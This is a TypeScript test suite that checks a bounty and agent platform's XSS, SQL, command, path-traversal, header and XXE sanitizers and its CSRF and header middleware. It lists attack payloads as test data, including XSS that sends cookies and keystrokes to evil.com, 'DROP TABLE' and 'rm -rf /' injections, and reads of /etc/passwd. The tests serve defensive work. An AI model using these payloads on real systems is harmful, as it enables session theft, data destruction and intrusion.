/**
 * Security Penetration Tests
 *
 * Comprehensive security tests simulating real-world attack scenarios
 * to verify the platform's defenses against common vulnerabilities.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { Request, Response, NextFunction } from "express";

// Import security modules
import {
  sanitizeForStorage,
  sanitizeBountyContent,
  sanitizeAgentContent,
  isContentSafe,
  detectUnsafeContent,
} from "../xssProtection";
import {
  generateCsrfToken,
  validateCsrfToken,
  csrfProtection,
} from "../csrfMiddleware";
import {
  sanitizeHtml,
  sanitizeUserText,
  sanitizeForDb,
  sanitizeObject,
} from "../validationSchemas";
import { securityHeaders } from "../securityHeaders";

// Test utilities
const createMockRequest = (overrides: Partial<Request> = {}): Request =>
  ({
    method: "GET",
    path: "/api/test",
    headers: {},
    body: {},
    params: {},
    query: {},
    session: { csrfToken: "valid-token" } as any,
    ...overrides,
  }) as unknown as Request;

const createMockResponse = (): Response => {
  const res: any = {
    statusCode: 200,
    _headers: {} as Record<string, string>,
  };
  res.status = vi.fn((code: number) => {
    res.statusCode = code;
    return res;
  });
  res.json = vi.fn((data: any) => {
    res._json = data;
    return res;
  });
  res.setHeader = vi.fn((key: string, value: string) => {
    res._headers[key] = value;
    return res;
  });
  res.removeHeader = vi.fn((key: string) => {
    delete res._headers[key];
    return res;
  });
  return res as Response;
};

const createMockNext = (): NextFunction => vi.fn();

describe("Security Penetration Tests", () => {
  afterEach(() => {
    vi.clearAllMocks();
  });

  // ==========================================================================
  // XSS (Cross-Site Scripting) Attack Tests
  // ==========================================================================
  describe("XSS Attack Prevention", () => {
    describe("Reflected XSS Attacks", () => {
      const reflectedXssVectors = [
        // URL parameter injection
        '<script>alert(document.domain)</script>',
        // Event handler injection
        '" onmouseover="alert(1)"',
        "' onclick='alert(1)'",
        // SVG-based XSS
        '<svg/onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        // IMG tag injection
        '<img src=x onerror=alert(1)>',
        '<img """><script>alert(1)</script>">',
        // Input field breakout
        '"><script>alert(1)</script>',
        "'/><script>alert(1)</script>",
        // JavaScript protocol
        'javascript:alert(document.cookie)',
        // Data URI XSS
        'data:text/html,<script>alert(1)</script>',
        // URL encoding bypass attempts
        '%3Cscript%3Ealert(1)%3C/script%3E',
        // Unicode encoding bypass
        '\u003Cscript\u003Ealert(1)\u003C/script\u003E',
      ];

      reflectedXssVectors.forEach((vector, index) => {
        it(`blocks reflected XSS vector #${index + 1}: ${vector.substring(0, 50)}...`, () => {
          const sanitized = sanitizeForStorage(vector);
          expect(sanitized).not.toMatch(/<script/i);
          expect(sanitized).not.toMatch(/javascript:/i);
          expect(sanitized).not.toMatch(/on\w+\s*=/i);
        });
      });
    });

    describe("Stored XSS Attacks", () => {
      const storedXssVectors = [
        // Comment section XSS
        { field: "comment", value: '<script>fetch("evil.com/steal?c="+document.cookie)</script>' },
        // Profile bio XSS
        { field: "bio", value: '<img src=x onerror="new Image().src=\'evil.com?\'+document.cookie">' },
        // Bounty title XSS
        { field: "title", value: '<svg onload="document.location=\'evil.com\'+">' },
        // Agent description XSS
        { field: "description", value: '<body onpageshow="alert(document.domain)">' },
        // Rich text editor bypass
        { field: "content", value: '<div style="background-image:url(javascript:alert(1))">' },
        // CSS injection
        { field: "content", value: '</style><script>alert(1)</script><style>' },
        // HTML entity encoding bypass
        { field: "title", value: '&lt;script&gt;alert(1)&lt;/script&gt;' },
      ];

      storedXssVectors.forEach(({ field, value }) => {
        it(`prevents stored XSS in ${field} field`, () => {
          const data = { [field]: value };
          const sanitized = sanitizeBountyContent(data);
          const result = sanitized[field] || "";
          expect(result).not.toMatch(/<script/i);
          expect(result).not.toMatch(/javascript:/i);
          expect(result).not.toMatch(/on\w+\s*=/i);
        });
      });
    });

    describe("DOM-Based XSS Attacks", () => {
      const domXssVectors = [
        // DOM clobbering
        '<form id="document"><input name="location" value="evil.com"></form>',
        '<img name="createElement">',
        '<a name="location" href="javascript:alert(1)">',
        // innerHTML manipulation
        '<div id="target"></div><script>target.innerHTML="<img src=x onerror=alert(1)>"</script>',
        // eval() injection
        '";alert(1);//',
        "';alert(1);//",
        // Template literal injection
        '${alert(1)}',
        '`${document.cookie}`',
      ];

      domXssVectors.forEach((vector, index) => {
        it(`blocks DOM XSS vector #${index + 1}`, () => {
          const result = sanitizeForStorage(vector);
          expect(isContentSafe(result)).toBe(true);
        });
      });
    });

    describe("Mutation XSS (mXSS) Attacks", () => {
      const mxssVectors = [
        // Parser confusion
        '<p><style><!--</style><script>alert(1)//--></script></p>',
        '<noscript><p title="</noscript><script>alert(1)</script>">',
        '<!--<script>',
        '<svg><p><style><!--</style><script>alert(1)</script>',
        // Attribute breaking
        '<a href="x" onclick="alert(1)" a="',
        // Namespace confusion
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
      ];

      mxssVectors.forEach((vector, index) => {
        it(`blocks mXSS vector #${index + 1}`, () => {
          const result = sanitizeForStorage(vector);
          expect(result).not.toMatch(/<script/i);
          expect(result).not.toMatch(/onerror/i);
        });
      });
    });
  });

  // ==========================================================================
  // SQL Injection Attack Tests
  // ==========================================================================
  describe("SQL Injection Prevention", () => {
    describe("Classic SQL Injection", () => {
      const sqlInjectionVectors = [
        // Basic injection
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1; DELETE FROM bounties",
        // UNION-based injection
        "' UNION SELECT * FROM users --",
        "1 UNION ALL SELECT null,null,username,password FROM users--",
        // Time-based blind injection
        "'; WAITFOR DELAY '0:0:10' --",
        "1' AND SLEEP(10) --",
        // Error-based injection
        "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --",
        "extractvalue(1,concat(0x7e,(SELECT password FROM users)))--",
        // Stacked queries
        "1; INSERT INTO users(username,password) VALUES('hacker','pwned')",
        // Comment injection
        "admin'--",
        "admin'/*",
        "*/admin'",
      ];

      sqlInjectionVectors.forEach((vector, index) => {
        it(`sanitizes SQL injection vector #${index + 1}: ${vector.substring(0, 40)}...`, () => {
          const result = sanitizeForDb({ input: vector });
          // Verify control characters are removed
          expect(result.input).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
        });
      });
    });

    describe("NoSQL Injection", () => {
      const nosqlInjectionVectors = [
        // MongoDB injection
        { $gt: "" },
        { $ne: 1 },
        { $where: "this.password.match(/.*/)"},
        // JSON injection
        '{"$gt": ""}',
        '{"$or": [{"x": 1}, {"y": 1}]}',
      ];

      nosqlInjectionVectors.forEach((vector, index) => {
        it(`handles NoSQL injection vector #${index + 1}`, () => {
          // The system should treat these as plain values, not operators
          const stringVector = typeof vector === 'string' ? vector : JSON.stringify(vector);
          const result = sanitizeUserText(stringVector);
          expect(typeof result).toBe('string');
        });
      });
    });

    describe("Second-Order SQL Injection", () => {
      it("sanitizes data that could cause second-order injection", () => {
        // Data stored that becomes dangerous when retrieved
        const maliciousUsername = "admin'--";
        const sanitized = sanitizeForDb({ username: maliciousUsername });
        // Control characters removed, but SQL special chars should be handled by parameterized queries
        expect(sanitized.username).not.toMatch(/[\x00]/);
      });
    });
  });

  // ==========================================================================
  // CSRF (Cross-Site Request Forgery) Attack Tests
  // ==========================================================================
  describe("CSRF Attack Prevention", () => {
    describe("CSRF Token Validation", () => {
      it("generates cryptographically secure tokens", () => {
        const tokens = new Set();
        for (let i = 0; i < 100; i++) {
          tokens.add(generateCsrfToken());
        }
        // All tokens should be unique
        expect(tokens.size).toBe(100);
        // Tokens should be 64 hex chars (32 bytes)
        expect(generateCsrfToken()).toMatch(/^[a-f0-9]{64}$/);
      });

      it("rejects requests without CSRF token", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/bounties",
          session: { csrfToken: "valid-token" } as any,
          headers: {},
          body: {},
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(res.json).toHaveBeenCalledWith(
          expect.objectContaining({ code: "CSRF_TOKEN_MISSING" })
        );
      });

      it("rejects requests with invalid CSRF token", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/bounties",
          session: { csrfToken: "valid-token" } as any,
          headers: { "x-csrf-token": "wrong-token" },
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(res.json).toHaveBeenCalledWith(
          expect.objectContaining({ code: "CSRF_TOKEN_INVALID" })
        );
      });

      it("accepts requests with valid CSRF token in header", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/bounties",
          session: { csrfToken: "valid-token-123" } as any,
          headers: { "x-csrf-token": "valid-token-123" },
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(next).toHaveBeenCalled();
        expect(res.status).not.toHaveBeenCalled();
      });

      it("accepts requests with valid CSRF token in body", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/bounties",
          session: { csrfToken: "valid-token-456" } as any,
          headers: {},
          body: { _csrf: "valid-token-456" },
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(next).toHaveBeenCalled();
      });

      it("skips CSRF for GET requests", () => {
        const req = createMockRequest({
          method: "GET",
          path: "/api/bounties",
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(next).toHaveBeenCalled();
      });

      it("skips CSRF for webhook endpoints", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/stripe/webhook",
          session: {} as any,
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(next).toHaveBeenCalled();
      });

      it("skips CSRF for JWT-authenticated requests", () => {
        const req = createMockRequest({
          method: "POST",
          path: "/api/bounties",
          headers: { authorization: "Bearer valid-jwt-token" },
          session: {} as any,
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(next).toHaveBeenCalled();
      });
    });

    describe("CSRF Timing Attack Prevention", () => {
      it("uses constant-time comparison for tokens", () => {
        // The timing safe comparison should prevent timing attacks
        // We verify by checking that validation happens regardless of partial match
        const validToken = generateCsrfToken();
        const similarToken = validToken.substring(0, 60) + "XXXX";

        const req = createMockRequest({
          method: "POST",
          path: "/api/test",
          session: { csrfToken: validToken } as any,
          headers: { "x-csrf-token": similarToken },
        });
        const res = createMockResponse();
        const next = createMockNext();

        validateCsrfToken(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
      });
    });
  });

  // ==========================================================================
  // Security Headers Tests
  // ==========================================================================
  describe("Security Headers", () => {
    it("sets X-Content-Type-Options to prevent MIME sniffing", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith("X-Content-Type-Options", "nosniff");
    });

    it("sets X-Frame-Options to prevent clickjacking", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith("X-Frame-Options", "DENY");
    });

    it("sets X-XSS-Protection for legacy browser support", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith("X-XSS-Protection", "1; mode=block");
    });

    it("sets Content-Security-Policy", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith(
        "Content-Security-Policy",
        expect.stringContaining("default-src 'self'")
      );
    });

    it("sets Referrer-Policy to control information leakage", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith(
        "Referrer-Policy",
        "strict-origin-when-cross-origin"
      );
    });

    it("sets Permissions-Policy to restrict browser features", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith(
        "Permissions-Policy",
        expect.stringContaining("camera=()")
      );
    });

    it("sets Cache-Control to no-store for API routes", () => {
      const req = createMockRequest({ path: "/api/sensitive" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.setHeader).toHaveBeenCalledWith(
        "Cache-Control",
        expect.stringContaining("no-store")
      );
    });

    it("removes X-Powered-By header", () => {
      const req = createMockRequest({ path: "/api/test" });
      const res = createMockResponse();
      const next = createMockNext();

      securityHeaders(req, res, next);

      expect(res.removeHeader).toHaveBeenCalledWith("X-Powered-By");
    });

    describe("HSTS in Production", () => {
      it("sets HSTS header in production", () => {
        const originalEnv = process.env.NODE_ENV;
        process.env.NODE_ENV = "production";

        const req = createMockRequest({ path: "/api/test" });
        const res = createMockResponse();
        const next = createMockNext();

        securityHeaders(req, res, next);

        expect(res.setHeader).toHaveBeenCalledWith(
          "Strict-Transport-Security",
          expect.stringContaining("max-age=31536000")
        );

        process.env.NODE_ENV = originalEnv;
      });
    });
  });

  // ==========================================================================
  // Command Injection Tests
  // ==========================================================================
  describe("Command Injection Prevention", () => {
    const commandInjectionVectors = [
      // Shell metacharacters
      "; ls -la",
      "| cat /etc/passwd",
      "&& rm -rf /",
      "$(whoami)",
      "`id`",
      "|| echo pwned",
      // Null byte injection
      "file.txt\x00.jpg",
      // Newline injection
      "input\nmalicious command",
      // Windows-specific
      "& dir",
      "| type C:\\Windows\\System32\\config\\SAM",
    ];

    commandInjectionVectors.forEach((vector, index) => {
      it(`sanitizes command injection vector #${index + 1}`, () => {
        const result = sanitizeForDb({ input: vector });
        // Verify null bytes and control chars are removed
        expect(result.input).not.toMatch(/[\x00]/);
      });
    });
  });

  // ==========================================================================
  // Path Traversal Tests
  // ==========================================================================
  describe("Path Traversal Prevention", () => {
    const pathTraversalVectors = [
      "../../../etc/passwd",
      "..\\..\\..\\Windows\\System32\\config\\SAM",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
      "..%c0%af..%c0%af..%c0%afetc/passwd",
      "..%252f..%252f..%252fetc/passwd",
      "/var/log/../../../etc/shadow",
      "file:///etc/passwd",
    ];

    pathTraversalVectors.forEach((vector, index) => {
      it(`identifies path traversal attempt #${index + 1}: ${vector.substring(0, 30)}...`, () => {
        // The sanitization should handle these as strings
        const result = sanitizeUserText(vector);
        expect(typeof result).toBe("string");
      });
    });
  });

  // ==========================================================================
  // Header Injection Tests
  // ==========================================================================
  describe("Header Injection Prevention", () => {
    const headerInjectionVectors = [
      // CRLF injection
      "value\r\nX-Injected: header",
      "value\nSet-Cookie: session=hijacked",
      // HTTP response splitting
      "value\r\n\r\n<html>injected content</html>",
      // Double CRLF
      "value\r\n\r\nHTTP/1.1 200 OK\r\n",
    ];

    headerInjectionVectors.forEach((vector, index) => {
      it(`sanitizes header injection vector #${index + 1}`, () => {
        const result = sanitizeForDb({ header: vector });
        // Control characters should be removed
        expect(result.header).not.toMatch(/[\r\n]/);
      });
    });
  });

  // ==========================================================================
  // JSON/Object Injection Tests
  // ==========================================================================
  describe("Object/Prototype Pollution Prevention", () => {
    it("sanitizes __proto__ pollution attempts", () => {
      const maliciousObj = {
        __proto__: { polluted: true },
        normal: "value",
      };
      const result = sanitizeObject(maliciousObj);
      expect(result.normal).toBe("value");
    });

    it("sanitizes constructor pollution attempts", () => {
      const maliciousObj = {
        constructor: { prototype: { polluted: true } },
        normal: "value",
      };
      const result = sanitizeObject(maliciousObj);
      expect(result.normal).toBe("value");
    });

    it("handles deeply nested objects", () => {
      const deepObj = {
        level1: {
          level2: {
            level3: {
              value: "<script>alert(1)</script>",
            },
          },
        },
      };
      const result = sanitizeObject(deepObj, true);
      expect(result.level1.level2.level3.value).not.toContain("<script>");
    });
  });

  // ==========================================================================
  // Unicode/Encoding Attack Tests
  // ==========================================================================
  describe("Unicode and Encoding Attack Prevention", () => {
    const unicodeAttacks = [
      // Homograph attacks
      "аdmin", // Cyrillic 'а' instead of Latin 'a'
      "pаypal.com", // Mixed scripts
      // Zero-width characters
      "admin\u200B", // Zero-width space
      "pass\u200Cword", // Zero-width non-joiner
      // Right-to-left override
      "benign\u202Etxt.exe", // RTL override
      // Unicode normalization attacks
      "café", // Uses combining character
      "\u0063\u0301afe", // 'c' + combining acute accent
      // Overlong UTF-8 encoding
      "\xC0\xAFscript", // Overlong encoding
    ];

    unicodeAttacks.forEach((vector, index) => {
      it(`handles unicode attack vector #${index + 1}`, () => {
        const result = sanitizeUserText(vector);
        expect(typeof result).toBe("string");
      });
    });
  });

  // ==========================================================================
  // XML External Entity (XXE) Pattern Tests
  // ==========================================================================
  describe("XXE Pattern Detection", () => {
    const xxePatterns = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
      '<!ENTITY % xxe SYSTEM "file:///etc/passwd">',
      '<![CDATA[<script>alert(1)</script>]]>',
    ];

    xxePatterns.forEach((pattern, index) => {
      it(`sanitizes XXE pattern #${index + 1}`, () => {
        const result = sanitizeForStorage(pattern);
        expect(result).not.toContain("<!DOCTYPE");
        expect(result).not.toContain("<!ENTITY");
      });
    });
  });

  // ==========================================================================
  // Input Validation Edge Cases
  // ==========================================================================
  describe("Input Validation Edge Cases", () => {
    it("handles extremely long strings", () => {
      const longString = "A".repeat(100000);
      const result = sanitizeForStorage(longString);
      expect(result.length).toBe(100000);
    });

    it("handles empty strings", () => {
      const result = sanitizeForStorage("");
      expect(result).toBe("");
    });

    it("handles null/undefined gracefully", () => {
      expect(sanitizeForStorage(null as any)).toBe("");
      expect(sanitizeForStorage(undefined as any)).toBe("");
    });

    it("handles numeric input", () => {
      expect(sanitizeForStorage(12345 as any)).toBe("");
    });

    it("handles array input", () => {
      expect(sanitizeForStorage(["<script>"] as any)).toBe("");
    });

    it("handles special characters", () => {
      const special = "!@#$%^&*()_+-=[]{}|;':\",./<>?";
      const result = sanitizeForStorage(special);
      expect(typeof result).toBe("string");
    });

    it("preserves safe whitespace", () => {
      const withWhitespace = "Hello\nWorld\tTest";
      const result = sanitizeUserText(withWhitespace);
      expect(result).toContain("\n");
      expect(result).toContain("\t");
    });

    it("handles mixed safe and unsafe content", () => {
      const mixed = "Hello <script>alert(1)</script> World";
      const result = sanitizeForStorage(mixed);
      expect(result).toContain("Hello");
      expect(result).toContain("World");
      expect(result).not.toMatch(/<script/i);
    });
  });

  // ==========================================================================
  // Content Detection Tests
  // ==========================================================================
  describe("Unsafe Content Detection", () => {
    it("detects multiple unsafe fields in complex objects", () => {
      const data = {
        safe: "Hello World",
        unsafe1: "<script>alert(1)</script>",
        nested: {
          safe: "Normal text",
          unsafe2: '<img src=x onerror="alert(2)">',
        },
        array: [
          "safe item",
          "<svg onload=alert(3)>",
        ],
      };

      const unsafeFields = detectUnsafeContent(data);
      expect(unsafeFields).toContain("unsafe1");
      expect(unsafeFields).toContain("nested.unsafe2");
      expect(unsafeFields).toContain("array[1]");
      expect(unsafeFields).not.toContain("safe");
      expect(unsafeFields).not.toContain("nested.safe");
    });

    it("returns empty array for completely safe content", () => {
      const safeData = {
        title: "My Bounty",
        description: "A normal description",
        reward: 1000,
      };

      const unsafeFields = detectUnsafeContent(safeData);
      expect(unsafeFields).toHaveLength(0);
    });
  });

  // ==========================================================================
  // Real-World Attack Scenario Tests
  // ==========================================================================
  describe("Real-World Attack Scenarios", () => {
    it("prevents bounty title XSS when displaying in list", () => {
      const attackerBounty = {
        title: '<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">Need help with task',
        description: "Normal description",
        reward: "500",
      };

      const sanitized = sanitizeBountyContent(attackerBounty);
      expect(sanitized.title).not.toContain("<img");
      expect(sanitized.title).not.toContain("onerror");
      expect(sanitized.title).not.toContain("fetch");
    });

    it("prevents agent bio XSS in marketplace listing", () => {
      const attackerAgent = {
        name: "Helpful Agent",
        bio: '<div onmouseover="window.location=\'https://phishing.com\'">Hover for surprise!</div>',
      };

      const sanitized = sanitizeAgentContent(attackerAgent);
      expect(sanitized.bio).not.toContain("onmouseover");
      expect(sanitized.bio).not.toContain("window.location");
    });

    it("prevents session hijacking via stored XSS", () => {
      const attackData = {
        content: `<script>
          var img = new Image();
          img.src = "https://evil.com/collect?session=" + document.cookie;
        </script>`,
      };

      const sanitized = sanitizeBountyContent(attackData);
      expect(sanitized.content).not.toContain("<script>");
      expect(sanitized.content).not.toContain("document.cookie");
    });

    it("prevents keylogger injection", () => {
      const keyloggerAttack = {
        description: `<script>
          document.addEventListener('keypress', function(e) {
            new Image().src = 'https://evil.com/log?key=' + e.key;
          });
        </script>`,
      };

      const sanitized = sanitizeBountyContent(keyloggerAttack);
      expect(sanitized.description).not.toContain("addEventListener");
      expect(sanitized.description).not.toContain("keypress");
    });

    it("prevents form hijacking", () => {
      const formHijack = {
        content: '<form action="https://evil.com/phish" method="POST"><input name="password" type="password"></form>',
      };

      const sanitized = sanitizeBountyContent(formHijack);
      expect(isContentSafe(sanitized.content || "")).toBe(true);
    });
  });
});
